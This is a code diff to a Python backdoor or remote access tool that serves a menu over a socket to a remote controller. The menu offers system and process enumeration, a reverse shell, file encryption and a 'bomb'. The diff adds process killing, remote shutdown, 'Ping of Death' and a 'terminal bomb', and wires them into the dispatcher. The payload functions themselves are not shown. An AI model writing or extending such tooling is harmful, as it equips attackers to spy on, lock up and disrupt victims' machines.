@@ -1,6 +1,12 @@
 #!/bin/env python3
 import socket
 import sys
+from terminalBomb import *
+from sysctrl import *
+from prockill import *
+from procEnum import *
+from sysEnum import *
+from osEnum import *
 from network import *
 from files import * 
 from usage import *
@@ -37,7 +43,7 @@ def banner(con):
 
 def menu(con):
     banner(con)
-    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. Process Information\n3. Information about Mama\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File\n9. Drop Bomb'
+    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. System Information\n3. Process Information\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File\n9. Drop Bomb\n10. Kill Process\n11. Shutdown/Restart\n12. Ping of Death\n13. Terminal Bomb\n'
     con.sendall(mainMenu)
     con.sendall(b'\nSpecify Option: ')
     opt = con.recv(1024)
@@ -48,7 +54,11 @@ def menu(con):
             opt = opt.decode()
             opt = int(opt)
             if(opt == 1):
-                con.sendall(b'kerjaan willi')
+                osMenu(con)
+            elif(opt == 2):
+                sysMenu(con)
+            elif(opt == 3):
+                procMenu(con)
             elif(opt == 4):
                 NetworkMenu(con)
             elif(opt == 5):
@@ -61,8 +71,12 @@ def menu(con):
                 encryptMenu(con)
             elif(opt == 9):
                 launchBomb(con)
-            else :
-                con.sendall(b'lol\n')
+            elif(opt == 10):
+                killProcess(con)
+            elif(opt == 11):
+                sysControl(con)
+            elif(opt == 13):
+                termBomb(con)
         except ValueError:
             con.sendall(b'Please only send integer value representing each option\n')
         except KeyboardInterrupt:
